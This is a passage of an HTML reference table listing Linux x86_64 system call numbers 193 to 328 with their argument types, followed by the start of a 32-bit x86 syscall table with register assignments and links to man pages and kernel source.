align="left">size_t size</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">193</td><td align="left">sys_fgetxattr</td><td align="left">int fd</td><td align="left">const har *name</td><td align="left">void *value</td><td align="left">size_t size</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">194</td><td align="left">sys_listxattr</td><td align="left">const char *pathname</td><td align="left">char *list</td><td align="left">size_t size</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">195</td><td align="left">sys_llistxattr</td><td align="left">const char *pathname</td><td align="left">char *list</td><td align="left">size_t size</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">196</td><td align="left">sys_flistxattr</td><td align="left">int fd</td><td align="left">char *list</td><td align="left">size_t size</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">197</td><td align="left">sys_removexattr</td><td align="left">const char *pathname</td><td align="left">const char *name</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">198</td><td align="left">sys_lremovexattr</td><td align="left">const char *pathname</td><td align="left">const char *name</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">199</td><td align="left">sys_fremovexattr</td><td align="left">int fd</td><td align="left">const char *name</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">200</td><td align="left">sys_tkill</td><td align="left">pid_t pid</td><td align="left">ing sig</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">201</td><td align="left">sys_time</td><td align="left">time_t *tloc</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">202</td><td align="left">sys_futex</td><td align="left">u32 *uaddr</td><td align="left">int op</td><td align="left">u32 val</td><td align="left">struct timespec *utime</td><td align="left">u32 *uaddr2</td><td align="left">u32 val3</td></tr><tr><td align="left">203</td><td align="left">sys_sched_setaffinity</td><td align="left">pid_t pid</td><td align="left">unsigned int len</td><td align="left">unsigned long *user_mask_ptr</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">204</td><td align="left">sys_sched_getaffinity</td><td align="left">pid_t pid</td><td align="left">unsigned int len</td><td align="left">unsigned long *user_mask_ptr</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">205</td><td align="left">sys_set_thread_area</td><td align="left">NOT IMPLEMENTED. Use arch_prctl</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">206</td><td align="left">sys_io_setup</td><td align="left">unsigned nr_events</td><td align="left">aio_context_t *ctxp</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">207</td><td align="left">sys_io_destroy</td><td align="left">aio_context_t ctx</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">208</td><td align="left">sys_io_getevents</td><td align="left">aio_context_t ctx_id</td><td align="left">long min_nr</td><td align="left">long nr</td><td align="left">struct io_event *events</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">209</td><td align="left">sys_io_submit</td><td align="left">aio_context_t ctx_id</td><td align="left">long nr</td><td align="left">struct iocb **iocbpp</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">210</td><td align="left">sys_io_cancel</td><td align="left">aio_context_t ctx_id</td><td align="left">struct iocb *iocb</td><td align="left">struct io_event *result</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">211</td><td align="left">sys_get_thread_area</td><td align="left">NOT IMPLEMENTED. Use arch_prctl</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">212</td><td align="left">sys_lookup_dcookie</td><td align="left">u64 cookie64</td><td align="left">long buf</td><td align="left">long len</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">213</td><td align="left">sys_epoll_create</td><td align="left">int size</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">214</td><td align="left">sys_epoll_ctl_old</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">215</td><td align="left">sys_epoll_wait_old</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">216</td><td align="left">sys_remap_file_pages</td><td align="left">unsigned long start</td><td align="left">unsigned long size</td><td align="left">unsigned long prot</td><td align="left">unsigned long pgoff</td><td align="left">unsigned long flags</td><td align="left"></td></tr><tr><td align="left">217</td><td align="left">sys_getdents64</td><td align="left">unsigned int fd</td><td align="left">struct linux_dirent64 *dirent</td><td align="left">unsigned int count</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">218</td><td align="left">sys_set_tid_address</td><td align="left">int *tidptr</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">219</td><td align="left">sys_restart_syscall</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">220</td><td align="left">sys_semtimedop</td><td align="left">int semid</td><td align="left">struct sembuf *tsops</td><td align="left">unsigned nsops</td><td align="left">const struct timespec *timeout</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">221</td><td align="left">sys_fadvise64</td><td align="left">int fd</td><td align="left">loff_t offset</td><td align="left">size_t len</td><td align="left">int advice</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">222</td><td align="left">sys_timer_create</td><td align="left">const clockid_t which_clock</td><td align="left">struct sigevent *timer_event_spec</td><td align="left">timer_t *created_timer_id</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">223</td><td align="left">sys_timer_settime</td><td align="left">timer_t timer_id</td><td align="left">int flags</td><td align="left">const struct itimerspec *new_setting</td><td align="left">struct itimerspec *old_setting</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">224</td><td align="left">sys_timer_gettime</td><td align="left">timer_t timer_id</td><td align="left">struct itimerspec *setting</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">225</td><td align="left">sys_timer_getoverrun</td><td align="left">timer_t timer_id</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">226</td><td align="left">sys_timer_delete</td><td align="left">timer_t timer_id</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">227</td><td align="left">sys_clock_settime</td><td align="left">const clockid_t which_clock</td><td align="left">const struct timespec *tp</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">228</td><td align="left">sys_clock_gettime</td><td align="left">const clockid_t which_clock</td><td align="left">struct timespec *tp</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">229</td><td align="left">sys_clock_getres</td><td align="left">const clockid_t which_clock</td><td align="left">struct timespec *tp</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">230</td><td align="left">sys_clock_nanosleep</td><td align="left">const clockid_t which_clock</td><td align="left">int flags</td><td align="left">const struct timespec *rqtp</td><td align="left">struct timespec *rmtp</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">231</td><td align="left">sys_exit_group</td><td align="left">int error_code</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">232</td><td align="left">sys_epoll_wait</td><td align="left">int epfd</td><td align="left">struct epoll_event *events</td><td align="left">int maxevents</td><td align="left">int timeout</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">233</td><td align="left">sys_epoll_ctl</td><td align="left">int epfd</td><td align="left">int op</td><td align="left">int fd</td><td align="left">struct epoll_event *event</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">234</td><td align="left">sys_tgkill</td><td align="left">pid_t tgid</td><td align="left">pid_t pid</td><td align="left">int sig</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">235</td><td align="left">sys_utimes</td><td align="left">char *filename</td><td align="left">struct timeval *utimes</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">236</td><td align="left">sys_vserver</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">237</td><td align="left">sys_mbind</td><td align="left">unsigned long start</td><td align="left">unsigned long len</td><td align="left">unsigned long mode</td><td align="left">unsigned long *nmask</td><td align="left">unsigned long maxnode</td><td align="left">unsigned flags</td></tr><tr><td align="left">238</td><td align="left">sys_set_mempolicy</td><td align="left">int mode</td><td align="left">unsigned long *nmask</td><td align="left">unsigned long maxnode</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">239</td><td align="left">sys_get_mempolicy</td><td align="left">int *policy</td><td align="left">unsigned long *nmask</td><td align="left">unsigned long maxnode</td><td align="left">unsigned long addr</td><td align="left">unsigned long flags</td><td align="left"></td></tr><tr><td align="left">240</td><td align="left">sys_mq_open</td><td align="left">const char *u_name</td><td align="left">int oflag</td><td align="left">mode_t mode</td><td align="left">struct mq_attr *u_attr</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">241</td><td align="left">sys_mq_unlink</td><td align="left">const char *u_name</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">242</td><td align="left">sys_mq_timedsend</td><td align="left">mqd_t mqdes</td><td align="left">const char *u_msg_ptr</td><td align="left">size_t msg_len</td><td align="left">unsigned int msg_prio</td><td align="left">const stuct timespec *u_abs_timeout</td><td align="left"></td></tr><tr><td align="left">243</td><td align="left">sys_mq_timedreceive</td><td align="left">mqd_t mqdes</td><td align="left">char *u_msg_ptr</td><td align="left">size_t msg_len</td><td align="left">unsigned int *u_msg_prio</td><td align="left">const struct timespec *u_abs_timeout</td><td align="left"></td></tr><tr><td align="left">244</td><td align="left">sys_mq_notify</td><td align="left">mqd_t mqdes</td><td align="left">const struct sigevent *u_notification</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">245</td><td align="left">sys_mq_getsetattr</td><td align="left">mqd_t mqdes</td><td align="left">const struct mq_attr *u_mqstat</td><td align="left">struct mq_attr *u_omqstat</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">246</td><td align="left">sys_kexec_load</td><td align="left">unsigned long entry</td><td align="left">unsigned long nr_segments</td><td align="left">struct kexec_segment *segments</td><td align="left">unsigned long flags</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">247</td><td align="left">sys_waitid</td><td align="left">int which</td><td align="left">pid_t upid</td><td align="left">struct siginfo *infop</td><td align="left">int options</td><td align="left">struct rusage *ru</td><td align="left"></td></tr><tr><td align="left">248</td><td align="left">sys_add_key</td><td align="left">const char *_type</td><td align="left">const char *_description</td><td align="left">const void *_payload</td><td align="left">size_t plen</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">249</td><td align="left">sys_request_key</td><td align="left">const char *_type</td><td align="left">const char *_description</td><td align="left">const char *_callout_info</td><td align="left">key_serial_t destringid</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">250</td><td align="left">sys_keyctl</td><td align="left">int option</td><td align="left">unsigned long arg2</td><td align="left">unsigned long arg3</td><td align="left">unsigned long arg4</td><td align="left">unsigned long arg5</td><td align="left"></td></tr><tr><td align="left">251</td><td align="left">sys_ioprio_set</td><td align="left">int which</td><td align="left">int who</td><td align="left">int ioprio</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">252</td><td align="left">sys_ioprio_get</td><td align="left">int which</td><td align="left">int who</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">253</td><td align="left">sys_inotify_init</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">254</td><td align="left">sys_inotify_add_watch</td><td align="left">int fd</td><td align="left">const char *pathname</td><td align="left">u32 mask</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">255</td><td align="left">sys_inotify_rm_watch</td><td align="left">int fd</td><td align="left">__s32 wd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">256</td><td align="left">sys_migrate_pages</td><td align="left">pid_t pid</td><td align="left">unsigned long maxnode</td><td align="left">const unsigned long *old_nodes</td><td align="left">const unsigned long *new_nodes</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">257</td><td align="left">sys_openat</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">int flags</td><td align="left">int mode</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">258</td><td align="left">sys_mkdirat</td><td align="left">int dfd</td><td align="left">const char *pathname</td><td align="left">int mode</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">259</td><td align="left">sys_mknodat</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">int mode</td><td align="left">unsigned dev</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">260</td><td align="left">sys_fchownat</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">uid_t user</td><td align="left">gid_t group</td><td align="left">int flag</td><td align="left"></td></tr><tr><td align="left">261</td><td align="left">sys_futimesat</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">struct timeval *utimes</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">262</td><td align="left">sys_newfstatat</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">struct stat *statbuf</td><td align="left">int flag</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">263</td><td align="left">sys_unlinkat</td><td align="left">int dfd</td><td align="left">const char *pathname</td><td align="left">int flag</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">264</td><td align="left">sys_renameat</td><td align="left">int oldfd</td><td align="left">const char *oldname</td><td align="left">int newfd</td><td align="left">const char *newname</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">265</td><td align="left">sys_linkat</td><td align="left">int oldfd</td><td align="left">const char *oldname</td><td align="left">int newfd</td><td align="left">const char *newname</td><td align="left">int flags</td><td align="left"></td></tr><tr><td align="left">266</td><td align="left">sys_symlinkat</td><td align="left">const char *oldname</td><td align="left">int newfd</td><td align="left">const char *newname</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">267</td><td align="left">sys_readlinkat</td><td align="left">int dfd</td><td align="left">const char *pathname</td><td align="left">char *buf</td><td align="left">int bufsiz</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">268</td><td align="left">sys_fchmodat</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">mode_t mode</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">269</td><td align="left">sys_faccessat</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">int mode</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">270</td><td align="left">sys_pselect6</td><td align="left">int n</td><td align="left">fd_set *inp</td><td align="left">fd_set *outp</td><td align="left">fd_set *exp</td><td align="left">struct timespec *tsp</td><td align="left">void *sig</td></tr><tr><td align="left">271</td><td align="left">sys_ppoll</td><td align="left">struct pollfd *ufds</td><td align="left">unsigned int nfds</td><td align="left">struct timespec *tsp</td><td align="left">const sigset_t *sigmask</td><td align="left">size_t sigsetsize</td><td align="left"></td></tr><tr><td align="left">272</td><td align="left">sys_unshare</td><td align="left">unsigned long unshare_flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">273</td><td align="left">sys_set_robust_list</td><td align="left">struct robust_list_head *head</td><td align="left">size_t len</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">274</td><td align="left">sys_get_robust_list</td><td align="left">int pid</td><td align="left">struct robust_list_head **head_ptr</td><td align="left">size_t *len_ptr</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">275</td><td align="left">sys_splice</td><td align="left">int fd_in</td><td align="left">loff_t *off_in</td><td align="left">int fd_out</td><td align="left">loff_t *off_out</td><td align="left">size_t len</td><td align="left">unsigned int flags</td></tr><tr><td align="left">276</td><td align="left">sys_tee</td><td align="left">int fdin</td><td align="left">int fdout</td><td align="left">size_t len</td><td align="left">unsigned int flags</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">277</td><td align="left">sys_sync_file_range</td><td align="left">long fd</td><td align="left">loff_t offset</td><td align="left">loff_t bytes</td><td align="left">long flags</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">278</td><td align="left">sys_vmsplice</td><td align="left">int fd</td><td align="left">const struct iovec *iov</td><td align="left">unsigned long nr_segs</td><td align="left">unsigned int flags</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">279</td><td align="left">sys_move_pages</td><td align="left">pid_t pid</td><td align="left">unsigned long nr_pages</td><td align="left">const void **pages</td><td align="left">const int *nodes</td><td align="left">int *status</td><td align="left">int flags</td></tr><tr><td align="left">280</td><td align="left">sys_utimensat</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">struct timespec *utimes</td><td align="left">int flags</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">281</td><td align="left">sys_epoll_pwait</td><td align="left">int epfd</td><td align="left">struct epoll_event *events</td><td align="left">int maxevents</td><td align="left">int timeout</td><td align="left">const sigset_t *sigmask</td><td align="left">size_t sigsetsize</td></tr><tr><td align="left">282</td><td align="left">sys_signalfd</td><td align="left">int ufd</td><td align="left">sigset_t *user_mask</td><td align="left">size_t sizemask</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">283</td><td align="left">sys_timerfd_create</td><td align="left">int clockid</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">284</td><td align="left">sys_eventfd</td><td align="left">unsigned int count</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">285</td><td align="left">sys_fallocate</td><td align="left">long fd</td><td align="left">long mode</td><td align="left">loff_t offset</td><td align="left">loff_t len</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">286</td><td align="left">sys_timerfd_settime</td><td align="left">int ufd</td><td align="left">int flags</td><td align="left">const struct itimerspec *utmr</td><td align="left">struct itimerspec *otmr</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">287</td><td align="left">sys_timerfd_gettime</td><td align="left">int ufd</td><td align="left">struct itimerspec *otmr</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">288</td><td align="left">sys_accept4</td><td align="left">int fd</td><td align="left">struct sockaddr *upeer_sockaddr</td><td align="left">int *upeer_addrlen</td><td align="left">int flags</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">289</td><td align="left">sys_signalfd4</td><td align="left">int ufd</td><td align="left">sigset_t *user_mask</td><td align="left">size_t sizemask</td><td align="left">int flags</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">290</td><td align="left">sys_eventfd2</td><td align="left">unsigned int count</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">291</td><td align="left">sys_epoll_create1</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">292</td><td align="left">sys_dup3</td><td align="left">unsigned int oldfd</td><td align="left">unsigned int newfd</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">293</td><td align="left">sys_pipe2</td><td align="left">int *filedes</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">294</td><td align="left">sys_inotify_init1</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">295</td><td align="left">sys_preadv</td><td align="left">unsigned long fd</td><td align="left">const struct iovec *vec</td><td align="left">unsigned long vlen</td><td align="left">unsigned long pos_l</td><td align="left">unsigned long pos_h</td><td align="left"></td></tr><tr><td align="left">296</td><td align="left">sys_pwritev</td><td align="left">unsigned long fd</td><td align="left">const struct iovec *vec</td><td align="left">unsigned long vlen</td><td align="left">unsigned long pos_l</td><td align="left">unsigned long pos_h</td><td align="left"></td></tr><tr><td align="left">297</td><td align="left">sys_rt_tgsigqueueinfo</td><td align="left">pid_t tgid</td><td align="left">pid_t pid</td><td align="left">int sig</td><td align="left">siginfo_t *uinfo</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">298</td><td align="left">sys_perf_event_open</td><td align="left">struct perf_event_attr *attr_uptr</td><td align="left">pid_t pid</td><td align="left">int cpu</td><td align="left">int group_fd</td><td align="left">unsigned long flags</td><td align="left"></td></tr><tr><td align="left">299</td><td align="left">sys_recvmmsg</td><td align="left">int fd</td><td align="left">struct msghdr *mmsg</td><td align="left">unsigned int vlen</td><td align="left">unsigned int flags</td><td align="left">struct timespec *timeout</td><td align="left"></td></tr><tr><td align="left">300</td><td align="left">sys_fanotify_init</td><td align="left">unsigned int flags</td><td align="left">unsigned int event_f_flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">301</td><td align="left">sys_fanotify_mark</td><td align="left">long fanotify_fd</td><td align="left">long flags</td><td align="left">__u64 mask</td><td align="left">long dfd</td><td align="left">long pathname</td><td align="left"></td></tr><tr><td align="left">302</td><td align="left">sys_prlimit64</td><td align="left">pid_t pid</td><td align="left">unsigned int resource</td><td align="left">const struct rlimit64 *new_rlim</td><td align="left">struct rlimit64 *old_rlim</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">303</td><td align="left">sys_name_to_handle_at</td><td align="left">int dfd</td><td align="left">const char *name</td><td align="left">struct file_handle *handle</td><td align="left">int *mnt_id</td><td align="left">int flag</td><td align="left"></td></tr><tr><td align="left">304</td><td align="left">sys_open_by_handle_at</td><td align="left">int dfd</td><td align="left">const char *name</td><td align="left">struct file_handle *handle</td><td align="left">int *mnt_id</td><td align="left">int flags</td><td align="left"></td></tr><tr><td align="left">305</td><td align="left">sys_clock_adjtime</td><td align="left">clockid_t which_clock</td><td align="left">struct timex *tx</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">306</td><td align="left">sys_syncfs</td><td align="left">int fd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">307</td><td align="left">sys_sendmmsg</td><td align="left">int fd</td><td align="left">struct mmsghdr *mmsg</td><td align="left">unsigned int vlen</td><td align="left">unsigned int flags</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">308</td><td align="left">sys_setns</td><td align="left">int fd</td><td align="left">int nstype</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">309</td><td align="left">sys_getcpu</td><td align="left">unsigned *cpup</td><td align="left">unsigned *nodep</td><td align="left">struct getcpu_cache *unused</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">310</td><td align="left">sys_process_vm_readv</td><td align="left">pid_t pid</td><td align="left">const struct iovec *lvec</td><td align="left">unsigned long liovcnt</td><td align="left">const struct iovec *rvec</td><td align="left">unsigned long riovcnt</td><td align="left">unsigned long flags</td></tr><tr><td align="left">311</td><td align="left">sys_process_vm_writev</td><td align="left">pid_t pid</td><td align="left">const struct iovec *lvec</td><td align="left">unsigned long liovcnt</td><td align="left">const struct iovcc *rvec</td><td align="left">unsigned long riovcnt</td><td align="left">unsigned long flags</td></tr><tr><td align="left">312</td><td align="left">sys_kcmp</td><td align="left">pid_t pid1</td><td align="left">pid_t pid2</td><td align="left">int type</td><td align="left">unsigned long idx1</td><td align="left">unsigned long idx2</td><td align="left"></td></tr><tr><td align="left">313</td><td align="left">sys_finit_module</td><td align="left">int fd</td><td align="left">const char __user *uargs</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">314</td><td align="left">sys_sched_setattr</td><td align="left">pid_t pid</td><td align="left">struct sched_attr __user *attr</td><td align="left">unsigned int flags</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">315</td><td align="left">sys_sched_getattr</td><td align="left">pid_t pid</td><td align="left">struct sched_attr __user *attr</td><td align="left">unsigned int size</td><td align="left">unsigned int flags</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">316</td><td align="left">sys_renameat2</td><td align="left">int olddfd</td><td align="left">const char __user *oldname</td><td align="left">int newdfd</td><td align="left">const char __user *newname</td><td align="left">unsigned int flags</td><td align="left"></td></tr><tr><td align="left">317</td><td align="left">sys_seccomp</td><td align="left">unsigned int op</td><td align="left">unsigned int flags</td><td align="left">const char __user *uargs</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">318</td><td align="left">sys_getrandom</td><td align="left">char __user *buf</td><td align="left">size_t count</td><td align="left">unsigned int flags</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">319</td><td align="left">sys_memfd_create</td><td align="left">const char __user *uname_ptr</td><td align="left">unsigned int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">320</td><td align="left">sys_kexec_file_load</td><td align="left">int kernel_fd</td><td align="left">int initrd_fd</td><td align="left">unsigned long cmdline_len</td><td align="left">const char __user *cmdline_ptr</td><td align="left">unsigned long flags</td><td align="left"></td></tr><tr><td align="left">321</td><td align="left">sys_bpf</td><td align="left">int cmd</td><td align="left">union bpf_attr *attr</td><td align="left">unsigned int size</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">322</td><td align="left">stub_execveat</td><td align="left">int dfd</td><td align="left">const char __user *filename</td><td align="left">const char __user *const __user *argv</td><td align="left">const char __user *const __user *envp</td><td align="left">int flags</td><td align="left"></td></tr><tr><td align="left">323</td><td align="left">userfaultfd</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">324</td><td align="left">membarrier</td><td align="left">int cmd</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">325</td><td align="left">mlock2</td><td align="left">unsigned long start</td><td align="left">size_t len</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">326</td><td align="left">copy_file_range</td><td align="left">int fd_in</td><td align="left">loff_t __user *off_in</td><td align="left">int fd_out</td><td align="left">loff_t __user * off_out</td><td align="left">size_t len</td><td align="left">unsigned int flags</td></tr><tr><td align="left">327</td><td align="left">preadv2</td><td align="left">unsigned long fd</td><td align="left">const struct iovec __user *vec</td><td align="left">unsigned long vlen</td><td align="left">unsigned long pos_l</td><td align="left">unsigned long pos_h</td><td align="left">int flags</td></tr><tr><td align="left">328</td><td align="left">pwritev2</td><td align="left">unsigned long fd</td><td align="left">const struct iovec __user *vec</td><td align="left">unsigned long vlen</td><td align="left">unsigned long pos_l</td><td align="left">unsigned long pos_h</td><td align="left">int flags</td></tr></tbody></table><h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><table><thead><tr><th>#</th><th>Name</th><th>Registers</th><th></th><th></th><th></th><th></th><th></th><th>Definition</th></tr></thead><tbody><tr><td></td><td></td><td>eax</td><td>ebx</td><td>ecx</td><td>edx</td><td>esi</td><td>edi</td><td></td></tr><tr><td>0</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/restart_syscall.2.html" target="_blank" rel="noopener">sys_restart_syscall</a></td><td>0x00</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2058" target="_blank" rel="noopener">kernel/signal.c:2058</a></td></tr><tr><td>1</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/exit.2.html" target="_blank" rel="noopener">sys_exit</a></td><td>0x01</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/exit.c?v=2.6.35#L1046" target="_blank" rel="noopener">kernel/exit.c:1046</a></td></tr><tr><td>2</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fork.2.html" target="_blank" rel="noopener">sys_fork</a></td><td>0x02</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="noopener">struct pt_regs *</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L716" target="_blank" rel="noopener">arch/alpha/kernel/entry.S:716</a></td></tr><tr><td>3</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/read.2.html" target="_blank" rel="noopener">sys_read</a></td><td>0x03</td><td>unsigned int fd</td><td>char __user *buf</td><td>size_t count</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L391" target="_blank" rel="noopener">fs/read_write.c:391</a></td></tr><tr><td>4</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/write.2.html" target="_blank" rel="noopener">sys_write</a></td><td>0x04</td><td>unsigned int fd</td><td>const char __user *buf</td><td>size_t count</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L408" target="_blank" rel="noopener">fs/read_write.c:408</a></td></tr><tr><td>5</td><td><a 